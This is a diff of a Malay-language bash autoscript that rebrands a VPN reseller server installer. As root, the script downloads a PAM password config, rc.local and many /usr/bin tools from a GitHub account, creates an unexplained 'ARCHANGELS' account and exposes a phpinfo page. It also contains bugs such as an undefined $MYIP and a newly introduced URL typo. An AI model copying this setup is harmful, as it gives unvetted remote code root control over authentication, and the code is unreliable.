@@ -1,23 +1,18 @@
 #!/bin/bash
 
-# START SCRIPT (FLuxoScript)
+# START SCRIPT (CuCu_AtoK)
 myip=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
 myint=`ifconfig | grep -B1 "inet addr:$myip" | head -n1 | awk '{print $1}'`;
 if [ $USER != 'root' ]; then
 echo "Sorry, for run the script please using root user"
 exit 1
 fi
-if [[ "$EUID" -ne 0 ]]; then
-echo "Sorry, you need to run this as root"
-exit 2
-fi
+
 if [[ $USER != "root" ]]; then
 	echo "Maaf, Anda harus menjalankan ini sebagai root"
 	exit
-if [[ ! -e /dev/net/tun ]]; then
-echo "TUN is not available"
-exit 3
 fi
+
 # initialisasi var
 export DEBIAN_FRONTEND=noninteractive
 OS=`uname -m`;
@@ -27,31 +22,50 @@ ether=`ifconfig | cut -c 1-8 | sort | uniq -u | grep venet0 | grep -v venet0:`
 if [[ $ether = "" ]]; then
         ether=eth0
 fi
+# Install lolcat
+apt-get install bc -y
+apt-get install xfonts-thai* -y
+apt-get install figlet
+apt-get install ruby -y
+apt-get install unzip
+wget https://github.com/busyloop/lolcat/archive/master.zip
+cd lolcat-master/bin
+gem install lolcat
+cd
+rm -r lolcat-master
+rm master.zip
+#vps="zvur";
+vps="aneka";
+
 if [[ $vps = "zvur" ]]; then
 	source="https://raw.githubusercontent.com/cucuatok93/cucuatok/master/tools"
 else
 	source="https://raw.githubusercontent.com/cucuatok93/cucuatok/master"
+
 fi
+
+# go to root
+cd
 
 echo ""
 echo -e "\e[38;5;6m     ========================================================="
-echo -e "\e[38;5;82m    *                 AUTOSCRIPT VPS ®2018                  *"
+echo -e "\e[38;5;82m    *                 AUTOSCRIPT VPS Â®2018                 *"
 echo -e "\e[38;5;6m     ========================================================="
-echo -e "\e[38;5;82m    *                     Contact Me                        *"
-echo -e "\e[38;5;6m     *                Channel: CuCuatoK_TeaM                 *"
-echo -e "\e[38;5;82m    *               Whatsapp: - +06175835809                *"
+echo -e "\e[38;5;6m     *                     Contact Me                        *"
+echo -e "\e[38;5;6m     *                Channel: NewPremiumService             *"
+echo -e "\e[38;5;6m     *                Whatsapp: -                            *"
 echo -e "\e[38;5;6m     *                Telegram: @Cucu_atok                   *"
 echo -e "\e[38;5;6m     ========================================================="
-echo -e "\e[38;5;226m   *               AUTOSCRIPT VPS ®2018                    *"
-echo -e "\e[38;5;6m     ========================================================="	
+echo -e "\e[38;5;6m     *                AUTOSCRIPT VPS Â®2018                  *"
+echo -e "\e[38;5;6m     ========================================================="
 # check registered ip
 wget -q -O IP "https://raw.githubusercontent.com/cucuatok93/cucuatok/master/IP.txt"
 if ! grep -w -q $MYIP IP; then
-	echo "MAAF!! Hanya IP terdaftar sahaja yang boleh menggunakan Autoscript ini"
+	echo "MAAF!! Hanya IP terdaftar sahaja yang boleh menggunakan Autoscript ini" | lolcat
 	if [[ $vps = "zvur" ]]; then
-		echo "PM Telagram: @Cucu_Ato_Sila Rujuk kepada admin Team"
+		echo "PM Telagram: @Cucu_Atok untuk dapatkan harga diskaun " | lolcat
 	else
-		echo "PM Telegram: @Cucu_Atok untuk dapatkan harga diskaun "
+		echo "PM Telegram: @Cucu_Atok untuk dapatkan harga diskaun " | lolcat
 	fi
 	rm -f /root/IP
 	exit
@@ -61,54 +75,19 @@ fi
                green='\e[0;32m'
                NC='\e[0m'
 
-               echo -e "\e[38;5;82m Sedang Connecting to Autoscript CuCu_Atok..."
+               echo -e "\e[38;5;82m Connecting to Autoscript CuCu_Atok..."
 			   sleep 1
 
 			   echo -e "\e[38;5;11m Connecting to your ip : $myip ...."
                sleep 2
                           echo -e "\e[38;5;13m Proses ini akan mengambil masa 10-15 minit"
 		sleep 2.5	  
-			   echo -e "\e[38;5;226m IP Anda Berjaya Di Daftarkan..."
+			   echo -e "\e[38;5;226m IP ANDA erjaya Di Daftarkan..."
                sleep 1.5
                
 			   echo -e "${green}Mula Setup...${NC}"
                sleep 1
 	       cd
-	
-	
-		
-	
-		
-	
-	
-	
-			
-			
-			  
-			
-			
-	
-	
-		
-	
-	
-		
-	
-		
-	
-	
-	
-			
-			
-    			
-					
- 
-clear
-echo "AUTOSSCIPT BY CuCu_Atok
-
-PLEASE CANCEL ALL PACKAGE POPUP
-
-AMBIL PERHATIAN !!!"
 clear
 echo "MULA MEMASANG AUTOSCRIPT"
 clear
@@ -117,7 +96,6 @@ ln -fs /usr/share/zoneinfo/Asia/Kuala_Lumpur /etc/localtime;
 clear
 echo "
 ENABLE IPV4 AND IPV6
-
 COMPLETE 1%
 "
 echo ipv4 >> /etc/modules
@@ -129,7 +107,6 @@ sysctl -p
 clear
 echo "
 REMOVE SPAM PACKAGE
-
 COMPLETE 10%
 "
 apt-get -y --purge remove samba*;
@@ -140,7 +117,6 @@ apt-get -y --purge remove bind*;
 clear
 echo "
 UPDATE AND UPGRADE PROCESS
-
 PLEASE WAIT TAKE TIME 1-5 MINUTE
 "
 sh -c 'echo "deb http://download.webmin.com/download/repository sarge contrib" > /etc/apt/sources.list.d/webmin.list'
@@ -150,11 +126,10 @@ apt-get -y autoremove;
 apt-get -y install wget curl;
 echo "
 INSTALLER PROCESS PLEASE WAIT
-
 TAKE TIME 5-10 MINUTE
 "
 # script
-wget -O /etc/pam.d/common-password "https:/raw.githubusercontent.com/cucuatok93/cucuatok/master//common-password"
+wget -O /etc/pam.d/common-password "https://raw.githubusercontent.com/cucuatok93/cucuatok/master/common-password"
 chmod +x /etc/pam.d/common-password
 # fail2ban & exim & protection
 apt-get -y install fail2ban sysv-rc-conf dnsutils dsniff zip unzip;
@@ -177,10 +152,10 @@ sed -i "s/ipserver/$myip/g" /etc/squid3/squid.conf
 sed -i "s/ipserver/$myip/g" /etc/squid/squid.conf
 # openvpn
 apt-get -y install openvpn
-wget -O /etc/openvpn/openvpn.tar "https://raw.githubusercontent.com/cucuatok93/cucuatok/master/openvpn.tar"
+wget -O /etc/openvpn/openvpn.tar "https://raw.githubusercontent.com/cucuatok93/cucuatok/master/opennvpn.tar"
 cd /etc/openvpn/;tar xf openvpn.tar;rm openvpn.tar
 wget -O /etc/rc.local "https://raw.githubusercontent.com/cucuatok93/cucuatok/master/rc.local";chmod +x /etc/rc.local
-#wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/cucuatok93/cucuatok/master/iptables.up.rules"
+#wget -O /etc/iptables.up.rules  "https://raw.githubusercontent.com/cucuatok93/cucuatok/master/iptables.up.rules"
 #sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
 #iptables-restore < /etc/iptables.up.rules
 # nginx
@@ -189,12 +164,12 @@ rm /etc/nginx/sites-enabled/default
 rm /etc/nginx/sites-available/default
 wget -O /etc/php/7.0/fpm/pool.d/www.conf "https://raw.githubusercontent.com/cucuatok93/cucuatok/master/www.conf"
 mkdir -p /home/vps/public_html
-echo "<pre>Setup by CuCuAtoK | telegram @CuCu_Atok </pre>" > /home/vps/public_html/index.php
+echo "<pre>Setup by SABAH9 | telegram @XXXXXXXXX </pre>" > /home/vps/public_html/index.php
 echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
-wget -O /etc/nginx/conf.d/vps.conf "https:/raw.githubusercontent.com/cucuatok93/cucuatok/master//vps.conf"
+wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/cucuatok93/cucuatok/master/vps.conf"
 sed -i 's/listen = \/var\/run\/php7.0-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/7.0/fpm/pool.d/www.conf
 # etc
-wget -O /home/vps/public_html/client.ovpn "https:/raw.githubusercontent.com/cucuatok93/cucuatok/master//client.ovpn"
+wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/cucuatok93/cucuatok/master/client.ovpn"
 sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
 sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
 useradd -m -g users -s /bin/bash ARCHANGELS
@@ -265,11 +240,11 @@ wget -O /usr/bin/speedtest "https://raw.githubusercontent.com/cucuatok93/cucuato
 wget -O /usr/bin/ps-mem "https://raw.githubusercontent.com/cucuatok93/cucuatok/master/tools/ps_mem.py"
 wget -O /usr/bin/dropmon "https://raw.githubusercontent.com/cucuatok93/cucuatok/master/tools/dropmon.sh"
 wget -O /usr/bin/menu "https://raw.githubusercontent.com/cucuatok93/cucuatok/master/tools/menu.sh"
-wget -O /usr/bin/user-active-list "https:/raw.githubusercontent.com/cucuatok93/cucuatok/master//tools/user-active-list.sh"
+wget -O /usr/bin/user-active-list "https://raw.githubusercontent.com/cucuatok93/cucuatok/master/tools/user-active-list.sh"
 wget -O /usr/bin/user-add "https://raw.githubusercontent.com/cucuatok93/cucuatok/master/tools/user-add.sh"
 wget -O /usr/bin/user-add-pptp "https://raw.githubusercontent.com/cucuatok93/cucuatok/master/tools/user-add-pptp.sh"
 wget -O /usr/bin/user-del "https://raw.githubusercontent.com/cucuatok93/cucuatok/master/tools/user-del.sh"
-wget -O /usr/bin/disable-user-expire "https://raw.githubusercontent.com/cucuatok93/cucuatok/master/cucuatok93/cucuatok/master/tools/disable-user-expire.sh"
+wget -O /usr/bin/disable-user-expire "https://raw.githubusercontent.com/cucuatok93/cucuatok/master/tools/disable-user-expire.sh"
 wget -O /usr/bin/delete-user-expire "https://raw.githubusercontent.com/cucuatok93/cucuatok/master/tools/delete-user-expire.sh"
 wget -O /usr/bin/banned-user "https://raw.githubusercontent.com/cucuatok93/cucuatok/master/tools/banned-user.sh"
 wget -O /usr/bin/unbanned-user "https://raw.githubusercontent.com/cucuatok93/cucuatok/master/tools/unbanned-user.sh"
@@ -335,16 +310,34 @@ service php7.0-fpm restart
 service webmin restart
 service squid restart
 service fail2ban restart
-						
+cd
+red='\e[1;31m'
+               green='\e[0;32m'
+               NC='\e[0m'
+
+               echo -e "\e[38;5;82m KAMI TENGAH BUAT KIRAAN VPS ANDA..."
+			   sleep 1
+
+			   echo -e "\e[38;5;11m DALAM KIRAAN 3...."
+               sleep 2
+                          echo -e "\e[38;5;13m DALAM KIRAAN 2"
+		sleep 2.5	  
+			   echo -e "\e[38;5;226m DALAM KIRAAN 1..."
+               sleep 1.5
+               
+			   echo -e "${green}SUDAH BERJAYA...${NC}"
+               sleep 1
+	     
+cd
 clear
 ## info
 echo ""  | tee -a log-install.txt
-echo "--------------------------Penjelasan Setup Server -------------------------" | lolcat
-echo "                         Copyright Team CucuaToK 2018                " | lolcat
-echo "                        https://t.me/cucu_atok              " | lolcat
-echo "----------------------------------------------------------------------------" | lolcat
+echo "--------------------------- Penjelasan Setup Server -------------------------" | lolcat
+echo "                            Copyright CuCuAtoK TeaM                          " | lolcat
+echo "                            https://t.me/CuCu_AtoK                           " | lolcat
+echo "-----------------------------------------------------------------------------" | lolcat
 echo "========================================"  | tee -a log-install.txt | lolcat
-echo "Service Autoscript TeaM CuCuatoK (TeaM CuCuatoK ServiCe SCRIPT 2018)"  | tee -a log-install.txt | lolcat
+echo "Service Autoscript CuCu_AtoK PerLis TeaM (CuCuAtoK TeaM SerVicE SCRIPT 2018)"  | tee -a log-install.txt | lolcat
 echo "----------------------------------------"  | tee -a log-install.txt | lolcat
 echo ""  | tee -a log-install.txt | lolcat
 echo "nginx : http://$myip:80"   | tee -a log-install.txt | lolcat
